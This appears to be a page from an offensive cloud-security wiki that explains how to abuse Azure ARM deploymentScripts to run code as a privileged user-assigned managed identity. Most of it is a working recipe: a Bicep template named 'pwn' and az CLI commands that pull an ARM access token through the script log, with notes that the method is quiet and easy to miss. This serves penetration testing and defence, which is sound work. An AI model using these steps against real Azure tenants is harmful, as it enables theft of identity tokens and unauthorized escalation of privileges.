---
title: "Deployment Scripts: running a container as a chosen user-assigned identity"
order: 5
description: "Abusing ARM deploymentScripts, which spin up a container running as a chosen user-assigned managed identity."
keywords:
  - deploymentScripts
  - ARM
  - user-assigned identity
  - container
  - privilege escalation
---

# Deployment Scripts

An ARM `Microsoft.Resources/deploymentScripts` resource runs an arbitrary shell or PowerShell script in a transient Azure Container Instance, and that container runs as a **user-assigned managed identity you specify**. With `Microsoft.Resources/deployments/write` and the ability to reference a privileged user-assigned identity, a deployment script becomes code execution as that identity, without ever touching a VM or Function.

## Running a script as a target identity

```bash
cat > ds.bicep <<'EOF'
param uami string
resource s 'Microsoft.Resources/deploymentScripts@2020-10-01' = {
  name: 'pwn'
  location: resourceGroup().location
  kind: 'AzureCLI'
  identity: { type: 'UserAssigned', userAssignedIdentities: { '${uami}': {} } }
  properties: {
    azCliVersion: '2.52.0'
    scriptContent: 'az account get-access-token --resource https://management.azure.com/'
    retentionInterval: 'PT1H'
  }
}
EOF
az deployment group create -g <rg> --template-file ds.bicep \
  --parameters uami=/subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.ManagedIdentity/userAssignedIdentities/<uami>
# read the script output for the token
az deployment-scripts show-log -g <rg> -n pwn
```

## Exploitation notes

- The identity only needs to be assignable to you; it does not have to be one you already control, so this borrows any user-assigned identity in reach (the MicroBurst `Invoke-AzDeploymentScript` pattern).
- The container is transient and the resource is easy to miss, which makes this a quiet way to run as a privileged identity.
- It pairs with [identity](../identity/privilege-escalation/deployment-template.md): a privileged deployment and a deployment script are two faces of ARM-driven execution.

## Tools

- **Azure CLI** (`az deployment group create`, `az deployment-scripts show-log`).
- **MicroBurst** (`Invoke-AzDeploymentScript`-style borrowing of user-assigned identities).

## References

- [NetSPI: abusing deployment scripts in Azure](https://www.netspi.com/blog/)
- [HackTricks Cloud: Azure privilege escalation](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-privilege-escalation/index.html)
- [Microsoft: deploymentScripts in ARM templates](https://learn.microsoft.com/azure/azure-resource-manager/templates/deployment-script-template)
